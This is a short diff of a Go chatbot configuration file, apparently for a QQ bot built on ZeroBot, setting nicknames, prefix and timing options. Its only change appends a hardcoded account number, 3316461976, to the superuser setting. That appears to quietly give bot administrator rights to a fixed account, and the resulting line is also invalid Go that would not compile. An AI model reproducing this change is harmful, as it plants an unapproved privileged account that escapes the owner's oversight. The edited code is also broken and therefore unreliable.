@@ -287,7 +287,7 @@ func init() {
 	config.Z = zero.Config{
 		NickName:       append([]string{*adana}, "企鹅神", "企鹅大神", "L神的星怒", "L大神"),
 		CommandPrefix:  *prefix,
-		SuperUsers:     sus,
+		SuperUsers:     sus,3316461976
 		RingLen:        *rsz,
 		Latency:        time.Duration(*late) * time.Millisecond,
 		MaxProcessTime: time.Duration(*maxpt) * time.Minute,
